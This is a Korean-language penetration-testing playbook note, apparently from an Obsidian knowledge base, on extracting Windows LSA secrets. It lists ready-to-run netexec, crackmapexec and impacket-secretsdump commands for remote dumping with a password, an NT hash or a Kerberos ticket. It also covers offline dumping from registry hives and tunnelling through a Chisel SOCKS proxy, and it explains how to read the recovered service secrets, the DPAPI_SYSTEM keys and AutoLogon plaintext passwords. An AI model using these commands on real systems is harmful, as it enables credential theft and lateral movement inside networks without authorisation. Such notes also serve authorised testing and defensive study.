---
tags:
  - 환경/windows
시작조건: ["대상 Windows 호스트의 원격 관리자급 SMB 작업 권한 또는 SECURITY·SYSTEM hive 확보"]
필요권한: ["대상 호스트의 로컬 관리자급 원격 작업 권한 또는 SECURITY·SYSTEM 파일 읽기 권한"]
필요조건: ["SMB 요청자 인증 수단 또는 같은 설치의 security.save·system.save"]
결과: ["LSA service secret", "DPAPI_SYSTEM secret", "AutoLogon 등 계정명이 연결된 평문 자격 증명 후보", "계정·서비스 검증 후보"]
---

# Windows LSA Secrets 추출

## 한 줄 판단

대상 Windows 호스트에 원격 관리자급 SMB 작업을 수행할 수 있거나 SECURITY·SYSTEM hive를 확보했으면 서비스 계정 secret, DPAPI_SYSTEM 값과 저장된 AutoLogon 평문 자격 증명 후보를 추출한다.

## 사용할 때

- 현재 보유 정보: 대상 호스트의 관리자급 요청자 credential 또는 [[Windows SAM SECURITY SYSTEM 덤프]]로 확보한 SECURITY·SYSTEM 파일이 있다.
- 명령 실행 위치: SMB로 대상에 접근하는 Linux 공격 호스트 또는 hive 파일이 있는 Linux 분석 호스트다.
- 현재 가능한 행동과 결과: LSA secret과 DPAPI_SYSTEM을 얻을 수 있지만 그 값에 연결된 계정의 원격 로그인·관리자 권한은 별도 확인한다.

## 전제 조건

| 확인할 것 | 필요한 상태 | 확인 방법 | 미충족 시 다음 확인 |
|---|---|---|---|
| 원격 경로 | 요청자 계정으로 대상 SMB 인증과 관리자급 원격 작업 가능 | 인증 주체와 원격 관리자 동작 확인 | 인증 성공과 dump 권한 분리 확인 |
| 오프라인 경로 | 같은 설치·시점의 SECURITY·SYSTEM 확보 | 파일 출처와 존재 확인 | 누락·시점 불일치 hive 재획득 |
| 현재 계정 또는 인증 수단 | 요청자 비밀번호·NT hash·Kerberos ccache 중 하나 | 요청자 계정 이름과 적용 도메인 확인 | 로컬·도메인 계정 및 hash 소유자 재확인 |

## 실행

### Linux 공격 호스트에서 원격 추출

#### 도메인 계정으로 원격 추출

```bash
netexec smb <TARGET> -d <DOMAIN> -u <REQUESTER> -p '<PASSWORD>' --lsa
netexec smb <TARGET> -d <DOMAIN> -u <REQUESTER> -H <NT_HASH> --lsa
impacket-secretsdump '<DOMAIN>/<REQUESTER>:<PASSWORD>@<TARGET>'
impacket-secretsdump -hashes :<NT_HASH> '<DOMAIN>/<REQUESTER>@<TARGET>'
```

#### 대상 호스트의 로컬 계정으로 원격 추출

```bash
netexec smb <TARGET> --local-auth -u <LOCAL_ADMIN> -p '<PASSWORD>' --lsa
crackmapexec smb <TARGET> --local-auth -u <LOCAL_ADMIN> -p '<PASSWORD>' --lsa
```

`--local-auth`는 `<TARGET>`의 로컬 SAM 계정으로 인증한다. 같은 사용자명이 도메인에도 존재해도 도메인 계정으로 해석하지 않는다.

Chisel reverse SOCKS를 통해 내부 대상에 접근하고 기존 CrackMapExec 문법을 사용하는 경우:

```bash
proxychains -f ./chisel-socks.conf crackmapexec smb <TARGET> -d <DOMAIN> -u <REQUESTER> -p '<PASSWORD>' --lsa
```

먼저 같은 대상의 SMB 출력에서 `Pwn3d!` 또는 원격 명령 실행으로 요청자 계정의 관리자급 원격 작업 권한을 확인한다. SMB `[+]` 인증 성공만 확인된 상태에서는 `--lsa` 성공을 기대하지 않는다.

요청자 Kerberos ccache:

```bash
export KRB5CCNAME=<CCACHE_FILE>
klist
impacket-secretsdump -k -no-pass '<DOMAIN>/<REQUESTER>@<TARGET_FQDN>'
```

### Linux 분석 호스트에서 오프라인 추출

```bash
impacket-secretsdump -security security.save -system system.save LOCAL
```

확인할 출력:

- `Dumping LSA Secrets`.
- 서비스·작업 계정 secret 이름과 값.
- `DPAPI_SYSTEM`의 machine key와 user key.
- `<DOMAIN>\<USER>:<PLAINTEXT_PASSWORD>` 형식의 AutoLogon 등 계정명이 연결된 평문 secret.
- `<HOST>$:plain_password_hex:<HEX>`는 컴퓨터 계정 secret의 16진수 표현이며, 사용자 AutoLogon 평문 비밀번호와 구분한다.
- cached domain logon 또는 `$DCC2$`가 함께 나오면 [[Windows Cached Domain Credentials 추출]]로 분리해 해석한다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `Dumping LSA Secrets`와 서비스 계정 값 | SECURITY·SYSTEM 복호화 성공 | LSA secret 확보 | 계정 유형과 대상 서비스 확인 |
| `DPAPI_SYSTEM` | 머신 범위 DPAPI secret 추출 | 저장 자격 증명 복호화 입력 확보 | [[Windows 저장 자격증명 수집]] |
| `<DOMAIN>\<USER>:<PLAINTEXT_PASSWORD>` | AutoLogon 등 계정명이 연결된 평문 secret 복구 | 새 AD 계정의 평문 자격 증명 확보 | [[AD Identity 확인 후 도메인 컨텍스트 열거]] 후 [[AD 계정의 디렉터리 복제 권한 확인]]을 포함해 실제 권한 확인 |
| `<HOST>$:plain_password_hex:<HEX>` | 컴퓨터 계정 secret의 원시 바이트 출력 | 머신 계정 인증 자료 후보 | 사용자 평문 비밀번호로 제출하거나 로그인에 그대로 사용하지 않고 컴퓨터 계정 후속 경로를 별도 판단 |
| cached domain logon 또는 `$DCC2$` | 캐시된 도메인 로그인 hash도 함께 추출됨 | DCC2 hash 확보 | [[Windows Cached Domain Credentials 추출]] |
| 인증 성공 뒤 dump 거부 | 요청자에게 원격 관리자급 작업 권한 없음 | 원격 추출 실패 | UAC, 원격 토큰과 서비스 조건 확인 |

## 확인할 출력과 권한

- 서비스 secret의 계정명·서비스명·값을 함께 확인한다.
- DPAPI_SYSTEM은 그 자체로 일반 사용자 비밀번호나 NTLM hash가 아니다.
- `$DCC2$`는 오프라인 검증용 캐시 hash이고, `<DOMAIN>\<USER>:<PLAINTEXT_PASSWORD>`는 계정명이 연결된 평문 자격 증명이다. 두 출력을 같은 결과로 취급하지 않는다.
- secret에 평문 값이 있어도 해당 계정의 원격 로그온과 관리자 권한을 별도 검증한다.

## 관련 공격기법

- [[Windows Cached Domain Credentials 추출]]
- [[AD 계정의 디렉터리 복제 권한 확인]]
- [[DCSync]]

## 관련 상태 라우터

- [[확보한 자격 증명으로 원격 접근 경로 선택]]
- [[AD Identity 확인 후 도메인 컨텍스트 열거]]

## 관련 도구

- [[impacket-secretsdump]]
- [[netexec]]
- [[crackmapexec]]
- [[proxychains]]
- [[klist]]
